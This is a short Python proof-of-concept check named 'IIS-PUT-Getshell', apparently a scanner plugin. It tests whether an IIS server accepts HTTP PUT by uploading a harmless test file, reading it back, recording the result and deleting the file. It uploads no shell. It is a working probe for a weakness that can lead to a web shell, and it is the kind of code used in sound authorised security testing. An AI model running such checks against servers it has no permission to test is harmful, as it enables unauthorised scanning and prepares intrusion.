#!/usr/bin/env python
# coding=utf-8
import requests
from report.report import save

pocname = "IIS-PUT-Getshell"
headers = {'Content-Type': 'application/x-www-form-urlencoded','User_Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36'}

def verify(arg, **kwargs):
	exploit = "/2222.txt"
	data = "This is a test!"
	try:
		r = requests.put(url=arg+exploit,headers=headers,data=data,timeout=7)
		r1 = requests.get(url=arg+exploit,headers=headers,timeout=5)
		if "This is a test!" in r1.text:
			save(arg,pocname,exploit)
			requests.delete(url=arg+exploit)
			return {"url": arg, "poc-name":pocname, "exploit": exploit}
	except Exception as e:
		pass